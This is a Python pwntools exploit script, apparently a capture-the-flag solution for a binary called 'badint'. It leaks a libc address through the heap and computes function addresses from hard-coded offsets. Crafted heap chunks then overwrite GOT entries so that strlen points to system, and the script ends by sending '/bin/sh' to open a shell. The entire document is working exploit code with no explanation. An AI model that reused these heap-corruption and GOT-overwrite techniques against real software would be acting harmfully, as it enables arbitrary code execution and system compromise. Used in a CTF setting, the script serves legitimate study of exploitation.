#!/usr/bin/python
from pwn import *

DEBUG = True

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

ubin_offset = 0x3c4b78
system_offset = 0x45390
strlen_offset = 0x8b720
fgets_offset = 0x6dad0

p = process('./badint')
# gdb.attach(p)

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def add_chunk(seq_num, offset, data, lsf = False):
  r("SEQ #: ")
  p.sendline(str(seq_num))

  r("Offset: ")
  p.sendline(str(offset))

  r("Data: ")
  p.sendline(data.encode("hex"))

  r("Yes/No: ")
  if lsf:
    p.sendline("Yes")
    r("\n")
    r("]: ")
    return r("\n")
  else:
    p.sendline("No")
    return ""

leak = add_chunk(0, 0x800, "A" * 0x7f, True)
libc_leak = u64(leak[:16].decode('hex'))
libc_base = libc_leak - ubin_offset

system_addr = libc_base + system_offset
strlen_addr = libc_base + strlen_offset
fgets_addr = libc_base + fgets_offset

print "[*] libc_leak : 0x%x" % libc_leak
print "[*] libc_base : 0x%x" % libc_base

add_chunk(0, 0, "B" * 0x5f, True)
add_chunk(0, 0, "C" * 0x37, True)

target = 0x604042

payload = p64(target)
payload = payload.ljust(0x30, "D")

payload += p64(0)
payload += p64(0x40)
payload = payload.ljust(0x5f, "D")

add_chunk(0, 0x1c0, payload, True)

overwrite = "E" * 0x6
overwrite += p64(fgets_addr)
overwrite += p64(strlen_addr)
overwrite += p64(system_addr)
overwrite = overwrite.ljust(0x37, 'E')

add_chunk(0, 0, overwrite)

p.sendline('/bin/sh\x00')

p.interactive()
p.close()
